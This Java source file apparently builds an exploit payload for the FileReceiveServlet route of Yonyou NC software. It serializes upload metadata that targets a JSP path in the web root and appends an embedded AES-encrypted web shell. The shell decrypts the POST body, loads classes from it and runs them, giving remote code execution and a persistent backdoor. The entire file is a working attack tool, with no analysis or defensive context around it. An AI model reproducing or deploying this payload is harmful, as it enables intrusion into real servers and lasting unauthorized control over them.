package exp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.util.Map;
import java.io.*;
import java.util.HashMap;

// 路由 /servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet
public class FileReceiveServlet {
    public static void main(String[] args) throws IOException {
        Map metaInfo=new HashMap();
        metaInfo.put("TARGET_FILE_PATH","webapps/nc_web");
        metaInfo.put("FILE_NAME","test.jsp");

        ByteArrayOutputStream bOut=new ByteArrayOutputStream();
        ObjectOutputStream os=new ObjectOutputStream(bOut);
        os.writeObject(metaInfo);
        String shell = " <%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";
        InputStream in= new ByteArrayInputStream(shell.getBytes());
        byte[] buf=new byte[1024];
        int len;
        while ((len=in.read(buf))!=-1){
            bOut.write(buf,0,len);
        }
        FileOutputStream fileOutputStream = new FileOutputStream("./FileReceiveServlet_upload");
        fileOutputStream.write(bOut.toByteArray());
    }
}